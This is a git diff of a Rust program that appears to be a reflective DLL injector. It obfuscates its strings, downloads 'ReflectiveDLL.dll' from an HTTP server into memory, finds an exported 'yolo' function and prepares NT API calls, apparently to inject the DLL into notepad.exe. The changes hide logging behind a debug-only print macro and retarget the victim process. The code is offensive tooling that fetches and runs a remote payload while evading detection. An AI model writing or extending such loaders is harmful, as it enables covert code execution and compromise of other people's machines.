@@ -7,6 +7,8 @@ mod inject;
 mod hwbp;
 mod file;
 mod nt_api;
+mod debug_helper;
+use crate::debug_helper::*;
 
 use obfuse::obfuse;
 use clap::Parser;
@@ -52,8 +54,8 @@ fn main() {
     // let obfused_url = obfuse!("http://192.168.48.1:8000/MCHELP.dll");
     let obfused_url = obfuse!("http://192.168.48.1:8000/ReflectiveDLL.dll");
     let url = obfused_url.as_str();
-    // let obfused_process = obfuse!("notepad.exe");
-    let obfused_process = obfuse!("typora.exe");
+    let obfused_process = obfuse!("notepad.exe");
+    // let obfused_process = obfuse!("typora.exe");
     let process = obfused_process.as_str();
 
     let obfused_rflname = obfuse!("yolo");
@@ -63,15 +65,16 @@ fn main() {
     //     thread::sleep(Duration::from_secs(1));
     // }
 
-    println!("[INFO] Downloading from {}", url);
+    debug_println!("[INFO] Downloading from {}", url);
 
     let data = download::download_to_memory(url, None, None)
         .expect("Failed to download file");
 
     if !data.is_empty() {
-        println!("[INFO] Downloaded {} bytes", data.len());
+        debug_println!("[INFO] Downloaded {} bytes", data.len());
     } else {
-        println!("[INFO] Downloaded empty file");
+        debug_println!("[INFO] Downloaded empty file");
+        return;
     }
 
 
@@ -79,7 +82,7 @@ fn main() {
     let dll = parse_pe::PeFileParser::new(&data);
 
     let func_raw = dll.get_func_raw(rflname).expect("[ERROR] Failed to find yolo function");
-    println!("[INFO] yolo raw offset: 0x{:X}", func_raw);
+    debug_println!("[INFO] yolo raw offset: 0x{:X}", func_raw);
 
     nt_api::init_nt_api().expect("[ERROR] Failed to initialize NT API!");
 
